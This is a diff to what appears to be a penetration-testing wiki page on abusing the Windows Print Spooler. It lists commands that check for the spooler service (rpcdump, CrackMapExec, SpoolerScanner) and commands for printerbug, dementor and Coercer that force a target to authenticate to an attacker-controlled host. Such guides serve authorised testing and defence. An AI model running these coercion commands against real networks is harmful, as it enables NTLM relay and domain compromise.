@@ -19,35 +19,56 @@ Remotely checking if the spooler is available can be done with [SpoolerScanner](
 The spooler service can be triggered with [printerbug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) or [SpoolSample](https://github.com/leechristensen/SpoolSample) (C#). There are many alternatives available publicly on the Internet.
 
 {% tabs %}
-{% tab title="printerbug" %}
-Using [printerbug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) (python) Trigger the spooler service
+{% tab title="Enumerate" %}
+#### rpcdump
 
-```bash
-printerbug.py 'DOMAIN'/'USER':'PASSWORD'@'TARGET' 'ATTACKER HOST'
-```
-{% endtab %}
-
-{% tab title="rpcdump" %}
-Check if the spooler service is available
+We can check if the spooler service is available on a target using [rpcdump.py](https://github.com/fortra/impacket/blob/master/examples/rpcdump.py) from impacket.
 
 ```bash
 rpcdump.py $TARGET | grep -A 6 "spoolsv"
 ```
-{% endtab %}
 
-{% tab title="CrackMapExec" %}
+#### CrackMapExec
+
 [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) (Python) can be used to check if the spooler service is running.
 
 ```bash
 crackmapexec smb <TARGET> -u <USER> -p <PASSWORD> -M spooler
+crackmapexec smb <TARGET> -u <USER> -p <PASSWORD> --local-auth -M spooler
 ```
-{% endtab %}
 
-{% tab title="SpoolerScanner" %}
+#### SpoolerScanner
+
 Check if the spooler service is available (Windows) using  [SpoolerScanner](https://github.com/vletoux/SpoolerScanner) (Powershell)
 
 ```powershell
 .\SpoolerScan.ps1
+```
+{% endtab %}
+
+{% tab title="Exploit" %}
+#### PrinterBug
+
+Using [printerbug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) (python) we can trigger the spooler to authenticate against our cotrolled server.
+
+```bash
+printerbug.py 'DOMAIN'/'USER':'PASSWORD'@'TARGET' 'ATTACKER HOST'
+```
+
+#### Dementor
+
+Using [dementor](https://github.com/NotMedic/NetNTLMtoSilverTicket/blob/master/dementor.py) (python) we can trigger the spooler to authenticate against our cotrolled server.
+
+```bash
+python dementor.py -d $DOMAIN -u $USERNAME -p $PASSWORD $ATTACKER_IP $TARGET_IP
+```
+
+#### Coercer
+
+Yet another alternative is to use the [Coercer](https://github.com/p0dalirius/Coercer/tree/master) tool (python) as follow.
+
+```bash
+coercer coerce -u $USER -p $PASSWORD -d $DOMAIN --filter-protocol-name MS-RPRN -l $ATTACKER_IP -t $TARGET_IP
 ```
 {% endtab %}
 
